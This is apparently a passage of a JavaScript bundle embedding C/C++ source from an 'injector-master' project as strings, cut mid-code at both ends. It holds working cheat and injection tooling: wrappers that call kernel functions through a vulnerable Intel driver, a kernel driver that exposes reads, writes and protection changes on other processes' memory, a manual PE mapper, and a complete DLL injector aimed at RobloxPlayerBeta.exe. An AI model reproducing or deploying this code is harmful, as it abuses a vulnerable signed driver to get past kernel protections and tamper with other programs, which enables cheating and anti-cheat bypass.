uint64_t intel_driver2::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		//Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver2::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		//Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver2::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		//Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver2::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		//Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver2::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver2::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		//Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/
`,bh=`// ioctl_dispatch.c — IRP_MJ_DEVICE_CONTROL dispatch table and completion routine
// Source: desktop 3-15/injector-master/Driver/control/controls.cpp

NTSTATUS DispatchDeviceControl(DEVICE_OBJECT* device_object, IRP* irp)
{
    UNREFERENCED_PARAMETER(device_object);

    NTSTATUS status      = STATUS_SUCCESS;
    UINT64   information = 0;

    const IO_STACK_LOCATION* io_stack = IoGetCurrentIrpStackLocation(irp);

    if (io_stack)
    {
        const ULONG io_request_size  = io_stack->Parameters.DeviceIoControl.InputBufferLength;
        const ULONG io_response_size = io_stack->Parameters.DeviceIoControl.OutputBufferLength;

        if (io_request_size  >= sizeof(BaseRequest) &&
            io_response_size >= sizeof(BaseResponse))
        {
            const PVOID io_request_data = irp->AssociatedIrp.SystemBuffer;

            if (io_request_data)
            {
                PVOID io_response_data = GetSystemAddressForMdl(irp->MdlAddress, NormalPagePriority);

                if (io_response_data)
                {
                    switch (io_stack->MajorFunction)
                    {
                        case IRP_MJ_DEVICE_CONTROL:
                        {
                            Operation io_operation =
                                (Operation)io_stack->Parameters.DeviceIoControl.IoControlCode;

                            switch (io_operation)
                            {
                                case Operation_QueryDriverVersion:
                                {
                                    if (io_request_size >= sizeof(QueryDriverVersionRequest))
                                    {
                                        QueryDriverVersionResponse response = { SignatureResponse };
                                        status = OnQueryDriverVersion(
                                            (QueryDriverVersionRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryRead:
                                {
                                    if (io_request_size >= sizeof(UserMemoryReadRequest))
                                    {
                                        UserMemoryReadResponse response = { SignatureResponse };
                                        status = OnUserMemoryRead(
                                            (UserMemoryReadRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryWrite:
                                {
                                    if (io_request_size >= sizeof(UserMemoryWriteRequest))
                                    {
                                        UserMemoryWriteResponse response = { SignatureResponse };
                                        status = OnUserMemoryWrite(
                                            (UserMemoryWriteRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                                case Operation_UserMemoryCommit:
                                {
                                    if (io_request_size >= sizeof(UserMemoryCommitRequest))
                                    {
                                        UserMemoryCommitResponse response = { SignatureResponse };
                                        status = FuckedUpMemoryAllocate(
                                            (UserMemoryCommitRequest*)io_request_data, &response);
                                        information = sizeof(response);
                                        RtlCopyMemory(io_response_data, &response, sizeof(response));
                                    }
                                    break;
                                }
                            }
                            break;
                        }
                    }
                }
            }
        }
    }

    if (information)
    {
        irp->IoStatus.Status      = status;
        irp->IoStatus.Information = information;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
    }
    else
    {
        status = STATUS_NOT_IMPLEMENTED;
    }

    return status;
}

NTSTATUS DeviceControl(DEVICE_OBJECT* device_object, IRP* irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    __try
    {
        status = DispatchDeviceControl(device_object, irp);

        if (status == STATUS_NOT_IMPLEMENTED)
            status = g_driver_dispatch(device_object, irp);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        TRACE("%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode());
        status = g_driver_dispatch(device_object, irp);
    }

    return status;
}
`,Th=`// kernel_loader.cpp — usermode -> kernel image resolver and export walker
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/kernelutility/load.cpp

}

std::uintptr_t Loader::GetSystemImage( const std::string& name )
{
	PVOID device_drivers[ 1024 ] = { };
	DWORD device_drivers_size = 0;

	K32EnumDeviceDrivers( device_drivers, sizeof( device_drivers ), &device_drivers_size );

	DWORD device_drivers_count = device_drivers_size / sizeof( PVOID );

	for( DWORD i = 0; i < device_drivers_count; i++ )
	{
		const auto device_driver = device_drivers[ i ];

		if( !device_driver )
			continue;

		char device_driver_name[ MAX_PATH ] = { };
		K32GetDeviceDriverBaseNameA( device_driver, device_driver_name, MAX_PATH );

		if( core::ToLower( device_driver_name ) == core::ToLower( name ) )
		{
			return std::uintptr_t( device_driver );
		}
	}

	return 0;
}

std::uintptr_t Loader::GetSystemImage( const std::wstring& name )
{
	PVOID device_drivers[ 1024 ] = { };
	DWORD device_drivers_size = 0;

	K32EnumDeviceDrivers( device_drivers, sizeof( device_drivers ), &device_drivers_size );

	DWORD device_drivers_count = device_drivers_size / sizeof( PVOID );

	for( DWORD i = 0; i < device_drivers_count; i++ )
	{
		const auto device_driver = device_drivers[ i ];

		if( !device_driver )
			continue;

		wchar_t device_driver_name[ MAX_PATH ] = { };
		K32GetDeviceDriverBaseNameW( device_driver, device_driver_name, MAX_PATH );

		if( core::ToLower( device_driver_name ) == core::ToLower( name ) )
		{
			return std::uintptr_t( device_driver );
		}
	}

	return 0;
}

std::uintptr_t Loader::GetImageExport( std::uintptr_t image, const std::string& name )
{
	if( !image )
	{
		TRACE( "%s: image is 0!", __FUNCTION__ );
		return 0;
	}

	const auto image_dos_header = Read< IMAGE_DOS_HEADER >( image );

	if( image_dos_header.e_magic != IMAGE_DOS_SIGNATURE )
	{
		TRACE( "%s: Not a valid DOS image!", __FUNCTION__ );
		return 0;
	}

	const auto image_nt_headers = Read< IMAGE_NT_HEADERS >( image + image_dos_header.e_lfanew );

	if( image_nt_headers.Signature != IMAGE_NT_SIGNATURE )
	{
		TRACE( "%s: Not a valid NT image!", __FUNCTION__ );
		return 0;
	}

	const auto& directory_entry_export = image_nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if( !directory_entry_export.VirtualAddress || !directory_entry_export.Size )
	{
		TRACE( "%s: Not a valid image export directory!", __FUNCTION__ );
		return 0;
	}

	const auto image_export_directory_data = std::make_unique< std::uint8_t[] >( directory_entry_export.Size );

	if( !ReadMemory( image + directory_entry_export.VirtualAddress, image_export_directory_data.get(), directory_entry_export.Size ) )
	{
		TRACE( "%s: ReadMemory( 0x%016llX, 0x%08X ) error!", __FUNCTION__, image + directory_entry_export.VirtualAddress, directory_entry_export.Size );
		return 0;
	}

	const auto image_export_directory = PIMAGE_EXPORT_DIRECTORY( image_export_directory_data.get() );
	const auto image_export_displacement = std::uintptr_t( image_export_directory_data.get() ) - directory_entry_export.VirtualAddress;

	const auto address_of_functions = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfFunctions );
	const auto address_of_names = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfNames );
	const auto address_of_name_ordinals = reinterpret_cast< std::uint16_t* >( image_export_displacement + image_export_directory->AddressOfNameOrdinals );

	for( auto i = 0ul; i < image_export_directory->NumberOfNames; i++ )
	{
		const auto export_name = std::string( PCHAR( image_export_displacement + address_of_names[ i ] ) );

		if( core::ToLower( export_name ) == core::ToLower( name ) )
		{
			const auto export_ordinal = address_of_name_ordinals[ i ];
			return ( image + address_of_functions[ export_ordinal ] );
		}
	}

	return 0;
}

bool Loader::InitializeUserCode()
{
	const auto image_native = std::uintptr_t( LoadLibraryW( L"ntdll.dll" ) );

	if( image_native )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( image_native ), "NtQueryInformationAtom" ) );

		if( m_user_procedure )
		{
			return true;
		}
	}

	m_image_gdi32 = std::uintptr_t( LoadLibraryW( L"gdi32full.dll" ) );

	if( !m_image_gdi32 )
	{
		m_image_gdi32 = std::uintptr_t( LoadLibraryW( L"gdi32.dll" ) );

		if( !m_image_gdi32 )
		{
			TRACE( "%s: LoadLibraryW( L\\"gdi32.dll\\" ) error! (0x%08X)", __FUNCTION__, GetLastError() );
			return false;
		}
	}

	const auto win32u = std::uintptr_t( LoadLibraryW( L"win32u.dll" ) );

	if( win32u )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( win32u ), "NtGdiGetCOPPCompatibleOPMInformation" ) );

		if( m_user_procedure )
		{
			m_windows_10 = true;
			return true;
		}
	}

	m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( m_image_gdi32 ), "NtGdiGetCOPPCompatibleOPMInformation" ) );

	if( !m_user_procedure )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( m_image_gdi32 ), "GetCOPPCompatibleOPMInformation" ) );

		if( !m_user_procedure )
		{
			TRACE( "%s: GetProcAddress( 0x%016llX, \\"NtGdiGetCOPPCompatibleOPMInformation\\" ) error! (0x%08X)", __FUNCTION__, m_image_gdi32, GetLastError() );
			return false;
		}

		m_windows_7 = true;
	}

	return true;
}

bool Loader::InitializeKernelCode()
{
	m_image_ntoskrnl = GetSystemImage( "ntoskrnl.exe" );

`,Ah=`// lua_injector.cpp — usermode injector with thread-suspend / IAT-aware module map / resume — minimal Lua-host bootstrap
// Source: D:/BackupFolder/lua/injector/injector.cpp

#include <windows.h>\r
#include <TlHelp32.h>\r
#include <iostream>\r
#include <vector>\r
#include <string>\r
#include <fstream> // For file operations\r
\r
// Log messages to a file\r
void Log(const std::string& message) {\r
    std::ofstream log("injector_log.txt", std::ios_base::app);\r
    if (log.is_open()) {\r
        log << message << std::endl;\r
    }\r
    else {\r
        std::cerr << "Failed to open log file." << std::endl;\r
    }\r
}\r
\r
// Get the process ID by name\r
DWORD GetProcessIdByName(const std::wstring& processName) {\r
    PROCESSENTRY32 processEntry;\r
    processEntry.dwSize = sizeof(PROCESSENTRY32);\r
\r
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\r
    if (hProcessSnapshot == INVALID_HANDLE_VALUE) {\r
        return 0;\r
    }\r
\r
    if (Process32First(hProcessSnapshot, &processEntry)) {\r
        do {\r
            if (_wcsicmp(processEntry.szExeFile, processName.c_str()) == 0) {\r
                CloseHandle(hProcessSnapshot);\r
                return processEntry.th32ProcessID;\r
            }\r
        } while (Process32Next(hProcessSnapshot, &processEntry));\r
    }\r
\r
    CloseHandle(hProcessSnapshot);\r
    return 0;\r
}\r
\r
// Suspend all threads in the target process\r
void SuspendAllThreads(HANDLE hProcess) {\r
    THREADENTRY32 threadEntry;\r
    threadEntry.dwSize = sizeof(THREADENTRY32);\r
\r
    HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\r
    if (hThreadSnapshot == INVALID_HANDLE_VALUE) {\r
        Log("CreateToolhelp32Snapshot for threads failed: " + std::to_string(GetLastError()));\r
        return;\r
    }\r
\r
    if (Thread32First(hThreadSnapshot, &threadEntry)) {\r
        do {\r
            if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess)) {\r
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);\r
                if (hThread) {\r
                    SuspendThread(hThread);\r
                    CloseHandle(hThread);\r
                }\r
            }\r
        } while (Thread32Next(hThreadSnapshot, &threadEntry));\r
    }\r
\r
    CloseHandle(hThreadSnapshot);\r
}\r
\r
// Resume all threads in the target process\r
void ResumeAllThreads(HANDLE hProcess) {\r
    THREADENTRY32 threadEntry;\r
    threadEntry.dwSize = sizeof(THREADENTRY32);\r
\r
    HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\r
    if (hThreadSnapshot == INVALID_HANDLE_VALUE) {\r
        Log("CreateToolhelp32Snapshot for threads failed: " + std::to_string(GetLastError()));\r
        return;\r
    }\r
\r
    if (Thread32First(hThreadSnapshot, &threadEntry)) {\r
        do {\r
            if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess)) {\r
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);\r
                if (hThread) {\r
                    ResumeThread(hThread);\r
                    CloseHandle(hThread);\r
                }\r
            }\r
        } while (Thread32Next(hThreadSnapshot, &threadEntry));\r
    }\r
\r
    CloseHandle(hThreadSnapshot);\r
}\r
\r
// Define NtCreateThreadEx function type\r
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(\r
    PHANDLE hThread,\r
    ACCESS_MASK DesiredAccess,\r
    PVOID ObjectAttributes,\r
    HANDLE ProcessHandle,\r
    PVOID lpStartAddress,\r
    PVOID lpParameter,\r
    ULONG CreateFlags,\r
    SIZE_T ZeroBits,\r
    SIZE_T StackSize,\r
    SIZE_T MaximumStackSize,\r
    PVOID lpAttributeList\r
    );\r
\r
// Inject reflective DLL into the target process using NtCreateThreadEx\r
bool InjectReflectiveDLL(const std::wstring& processName, const std::wstring& dllPath) {\r
    DWORD processId = GetProcessIdByName(processName);\r
    if (processId == 0) {\r
        Log("Failed to find process: " + std::string(processName.begin(), processName.end()));\r
        return false;\r
    }\r
    Log("Found process ID: " + std::to_string(processId));\r
\r
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);\r
    if (hProcess == NULL) {\r
        Log("OpenProcess failed: " + std::to_string(GetLastError()));\r
        return false;\r
    }\r
    Log("OpenProcess succeeded");\r
\r
    // Suspend all threads\r
    SuspendAllThreads(hProcess);\r
    Log("All threads suspended");\r
\r
    // Read the DLL into memory\r
    std::ifstream dllFile(dllPath, std::ios::binary | std::ios::ate);\r
    if (!dllFile.is_open()) {\r
        Log("Failed to open DLL file");\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
    std::streamsize dllSize = dllFile.tellg();\r
    dllFile.seekg(0, std::ios::beg);\r
\r
    std::vector<char> buffer(dllSize);\r
    if (!dllFile.read(buffer.data(), dllSize)) {\r
        Log("Failed to read DLL file");\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
    dllFile.close();\r
\r
    // Allocate memory in the target process\r
    LPVOID pRemoteDLL = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\r
    if (pRemoteDLL == NULL) {\r
        Log("VirtualAllocEx failed: " + std::to_string(GetLastError()));\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
    Log("Memory allocated in target process");\r
\r
    // Write the DLL to the allocated memory\r
    SIZE_T written;\r
    if (!WriteProcessMemory(hProcess, pRemoteDLL, buffer.data(), dllSize, &written)) {\r
        Log("WriteProcessMemory failed: " + std::to_string(GetLastError()));\r
        VirtualFreeEx(hProcess, pRemoteDLL, 0, MEM_RELEASE);\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
    Log("DLL written to target process memory");\r
\r
    // Load NtCreateThreadEx from ntdll.dll\r
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");\r
    if (!hNtDll) {\r
        Log("GetModuleHandle for ntdll.dll failed: " + std::to_string(GetLastError()));\r
        VirtualFreeEx(hProcess, pRemoteDLL, 0, MEM_RELEASE);\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
\r
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtDll, "NtCreateThreadEx");\r
    if (!NtCreateThreadEx) {\r
        Log("GetProcAddress for NtCreateThreadEx failed: " + std::to_string(GetLastError()));\r
        VirtualFreeEx(hProcess, pRemoteDLL, 0, MEM_RELEASE);\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
\r
    HANDLE hThread;\r
    NTSTATUS status = NtCreateThreadEx(\r
        &hThread,\r
        THREAD_ALL_ACCESS,\r
        NULL,\r
        hProcess,\r
        (PVOID)pRemoteDLL,\r
        NULL,\r
        FALSE,\r
        NULL,\r
        NULL,\r
        NULL,\r
        NULL\r
    );\r
\r
    if (status != 0) {\r
        Log("NtCreateThreadEx failed: " + std::to_string(status));\r
        VirtualFreeEx(hProcess, pRemoteDLL, 0, MEM_RELEASE);\r
        CloseHandle(hProcess);\r
        return false;\r
    }\r
    Log("NtCreateThreadEx succeeded");\r
\r
    // Wait for the thread to finish\r
    WaitForSingleObject(hThread, INFINITE);\r
    CloseHandle(hThread);\r
\r
    // Resume all threads\r
    ResumeAllThreads(hProcess);\r
    Log("All threads resumed");\r
\r
    VirtualFreeEx(hProcess, pRemoteDLL, 0, MEM_RELEASE);\r
    CloseHandle(hProcess);\r
\r
    Log("DLL injected successfully");\r
    return true;\r
}\r
\r
int main() {\r
    std::wstring processName = L"RobloxPlayerBeta.exe"; // Replace with the name of the target process\r
    std::wstring dllPath = L"C:\\\\Users\\\\eric\\\\source\\\\repos\\\\lua\\\\x64\\\\Release\\\\lua.dll"; // Replace with the path to the DLL\r
\r
    if (!InjectReflectiveDLL(processName, dllPath)) {\r
        Log("Failed to inject DLL");\r
        return 1;\r
    }\r
\r
    Log("DLL injected successfully");\r
    return 0;\r
}\r
`,Rh=`// manual_map.cpp — usermode manual mapper (IAT resolution + relocation + section copy)
// Source: desktop 3-15/injector-master/Loader/core/mmaps.cpp

PVOID rva_va(uintptr_t rva, PIMAGE_NT_HEADERS nt_head, PVOID local_image)
{
	PIMAGE_SECTION_HEADER p_first_sect = IMAGE_FIRST_SECTION(nt_head);
	for (PIMAGE_SECTION_HEADER p_section = p_first_sect;
	     p_section < p_first_sect + nt_head->FileHeader.NumberOfSections;
	     p_section++)
	{
		if (rva >= p_section->VirtualAddress &&
		    rva < p_section->VirtualAddress + p_section->Misc.VirtualSize)
			return (PUCHAR)local_image + p_section->PointerToRawData + (rva - p_section->VirtualAddress);
	}
	return NULL;
}

uintptr_t resolve_func_addr(LPCSTR modname, LPCSTR modfunc)
{
	HMODULE h_module = LoadLibraryExA(modname, NULL, DONT_RESOLVE_DLL_REFERENCES);
	uintptr_t func_offset = (uintptr_t)GetProcAddress(h_module, modfunc);
	func_offset -= (uintptr_t)h_module;
	FreeLibrary(h_module);
	return func_offset;
}

extern "C" NTSYSAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);

BOOL resolve_import(PVOID p_local_img)
{
	const auto image_nt_headers = RtlImageNtHeader(p_local_img);
	if (!image_nt_headers)
		TRACE("Invalid PE Headers");

	TRACE("Resolving Imports...");

	PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)rva_va(
		image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
		image_nt_headers, p_local_img);

	if (!image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
	    || !image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
		return true;

	LPSTR module_name = NULL;
	while ((module_name = (LPSTR)rva_va(import_desc->Name, image_nt_headers, p_local_img)))
	{
		uintptr_t base_image;
		base_image = call_remote_load_library(module_name);

		if (!base_image)
			return false;

		PIMAGE_THUNK_DATA ih_data = (PIMAGE_THUNK_DATA)rva_va(
			import_desc->FirstThunk, image_nt_headers, p_local_img);

		while (ih_data->u1.AddressOfData)
		{
			if (ih_data->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				ih_data->u1.Function = base_image +
					resolve_func_addr(module_name, (LPCSTR)(ih_data->u1.Ordinal & 0xFFFF));
			}
			else
			{
				IMAGE_IMPORT_BY_NAME* ibn = (PIMAGE_IMPORT_BY_NAME)rva_va(
					ih_data->u1.AddressOfData, image_nt_headers, p_local_img);
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)ibn->Name);
				TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, ih_data->u1.Function);
			}
			ih_data++;
		}
		import_desc++;
	}
	return true;
}
`,wh=`// mem_dispatch.cpp — kernel IRP_MJ_DEVICE_CONTROL dispatch with per-control memory ops (read/write/query/protect)
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/control/controls.cpp

	return status;
}

NTSTATUS OnUserMemoryRead( const UserMemoryReadRequest* const request, UserMemoryReadResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			auto from_process = process.GetProcess();
			auto from_address = memory::ToPointer( request->m_address );
			auto to_process = PsGetCurrentProcess();
			auto to_address = memory::ToPointer( request->m_data );
			auto buffer_size = request->m_size;
			auto number_of_bytes_copied = static_cast< SIZE_T >( 0 );

			status = MmCopyVirtualMemory( from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied );

			if( NT_SUCCESS( status ) )
			{
				response->m_size = static_cast< std::size_t >( number_of_bytes_copied );
			}
			else
			{
				TRACE( "%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryWrite( const UserMemoryWriteRequest* const request, UserMemoryWriteResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			auto from_process = PsGetCurrentProcess();
			auto from_address = memory::ToPointer( request->m_data );
			auto to_process = process.GetProcess();
			auto to_address = memory::ToPointer( request->m_address );
			auto buffer_size = request->m_size;
			auto number_of_bytes_copied = static_cast< SIZE_T >( 0 );

			status = MmCopyVirtualMemory( from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied );

			if( NT_SUCCESS( status ) )
			{
				response->m_size = static_cast< std::size_t >( number_of_bytes_copied );
			}
			else
			{
				TRACE( "%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryQuery( const UserMemoryQueryRequest* const request, UserMemoryQueryResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			process.Attach();

			auto current_process = NtCurrentProcess();
			auto base_address = memory::ToPointer( request->m_address );

			SIZE_T return_length = 0;

			MEMORY_BASIC_INFORMATION information = { };
			status = ZwQueryVirtualMemory( current_process, base_address, MemoryBasicInformation, &information, sizeof( information ), &return_length );

			if( NT_SUCCESS( status ) )
			{
				auto destination = memory::ToAddress( response ) + FIELD_OFFSET( UserMemoryQueryResponse, m_base_address );
				std::memcpy( memory::ToPointer( destination ), &information, sizeof( information ) );
			}
			else
			{
				TRACE( "%s: ZwQueryVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}

			process.Detach();
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryProtect(const UserMemoryProtectRequest* const request, UserMemoryProtectResponse* response)
{
	auto status = STATUS_SUCCESS;

	if (request->IsValid())
	{
		win32::Process process(request->m_process_id);

		if (process.IsValid())
		{
			KAPC_STATE apc;
			KeStackAttachProcess(process.GetProcess(), &apc);
			{
				auto from_address = memory::ToPointer(request->m_address);
				auto buffer_size = request->m_size;
				auto protection_type = request->m_protection;

				ULONG old;
				status = ZwProtectVirtualMemory(ZwCurrentProcess(), &from_address, &buffer_size, protection_type, &old);//MmCopyVirtualMemory(from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied);

				if (NT_SUCCESS(status))
				{
					response->m_size = static_cast<std::size_t>(old);
				}
				else
				{
					TRACE("%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status);
				}
			}
			KeUnstackDetachProcess(&apc);
		}
		else
		{
			status = process.GetStatus();
			TRACE("%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus());
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE("%s: request->IsValid() error!", __FUNCTION__);
	}

	response->m_status = status;
	return status;
}

void* GetSystemAddressForMdl( PMDL descriptor, ULONG priority )
{
	if( descriptor->MdlFlags & ( MDL_MAPPED_TO_SYSTEM_VA | MDL_SOURCE_IS_NONPAGED_POOL ) )
	{
		return descriptor->MappedSystemVa;
	}

	return MmMapLockedPagesSpecifyCache( descriptor, KernelMode, MmNonCached, nullptr, FALSE, priority );
}

NTSTATUS DispatchDeviceControl( DEVICE_OBJECT* device_object, IRP* irp )
{
	UNREFERENCED_PARAMETER( device_object );

	auto status = STATUS_SUCCESS;
	auto information = static_cast< std::uint64_t >( 0 );

	const auto io_stack = IoGetCurrentIrpStackLocation( irp );

	if( io_stack )
	{
		const auto io_request_size = io_stack->Parameters.DeviceIoControl.InputBufferLength;
		const auto io_response_size = io_stack->Parameters.DeviceIoControl.OutputBufferLength;

		if( io_request_size >= sizeof( BaseRequest ) && io_response_size >= sizeof( BaseResponse ) )
		{
			const auto io_request_data = irp->AssociatedIrp.SystemBuffer;

			if( io_request_data )
			{
				auto io_response_data = GetSystemAddressForMdl( irp->MdlAddress, NormalPagePriority );

				if( io_response_data )
				{
					switch( io_stack->MajorFunction )
					{
						case IRP_MJ_DEVICE_CONTROL:
						{
							const auto io_operation = static_cast< Operation >( io_stack->Parameters.DeviceIoControl.IoControlCode );

							switch( io_operation )
							{
								case Operation::QueryDriverVersion:
								{
									const auto request = static_cast< const QueryDriverVersionRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverVersionRequest ) )
									{
										QueryDriverVersionResponse response = { SignatureResponse };
										
										status = OnQueryDriverVersion( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryDriverSecure:
								{
									const auto request = static_cast< const QueryDriverSecureRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverSecureRequest ) )
									{
										QueryDriverSecureResponse response = { SignatureResponse };

										status = OnQueryDriverSecure( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryDriverQuit:
								{
									const auto request = static_cast< const QueryDriverQuitRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverQuitRequest ) )
									{
										QueryDriverQuitResponse response = { SignatureResponse };

